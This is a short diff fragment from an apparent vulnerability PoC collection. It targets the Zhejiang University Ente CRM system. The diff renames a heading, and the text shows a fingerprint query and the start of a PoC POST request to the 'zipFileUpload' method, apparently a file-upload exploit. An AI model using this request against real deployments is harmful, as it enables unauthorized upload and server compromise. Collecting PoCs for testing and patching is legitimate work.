@@ -7,7 +7,7 @@
 app="浙大恩特客户资源管理系统"
 ```
 
-## poc
+## POC
 ```
 POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1
 Host: 
